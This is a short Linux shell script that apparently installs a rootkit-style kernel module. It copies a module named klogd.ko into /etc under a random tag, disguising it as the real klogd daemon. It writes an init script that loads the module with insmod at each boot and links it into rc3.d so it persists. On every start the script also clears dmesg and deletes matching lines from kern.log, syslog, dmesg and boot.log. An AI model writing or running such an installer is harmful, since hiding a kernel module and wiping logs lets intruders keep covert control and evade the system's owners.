#!/bin/sh
###
###

echo -e "Installing\n"

if [ `whoami` != "root" ]; then
   echo -e "\n[E] must be root"
   exit 1
fi

echo ""
#--------------------------------------------------------------------
Pwd_Dir=$(pwd)


hide_tag="bL6qM"

src_ko=klogd.ko
# xxx, "/etc/"
dst_ko=/etc/$hide_tag

start_path=/etc/init.d/$hide_tag



cat > $Pwd_Dir/tmp1 <<EOF
#!/bin/sh
#
case "\$1" in
'start')
	/sbin/insmod ${dst_ko}
	dmesg -C
	sed -i '/klogd/d' /var/log/kern.log || true
	sed -i '/klogd/d' /var/log/syslog || true
	sed -i '/klogd/d' /var/log/dmesg || true
	sed -i '/bL6qM/d' /var/log/boot.log || true
	;;
'stop')

	;;
esac

exit 0

EOF


_install1 () {

	cp $Pwd_Dir/tmp1 $start_path

	chmod +x $start_path
	
	cp $Pwd_Dir/$src_ko $dst_ko
	
	ln -sf $start_path /etc/rc3.d/S55$hide_tag

	
	if [ -x /etc/init.d/$hide_tag ]; then
		/etc/init.d/$hide_tag start
		
		echo " >> ko path: "$dst_ko
		echo " >> start path: "${start_path}""
		
		echo -e "    --- ok ---    \n"
	fi

	exit 0;
}

if [ -x /etc/init.d/ ]; then
   _install1
fi
   

exit 0
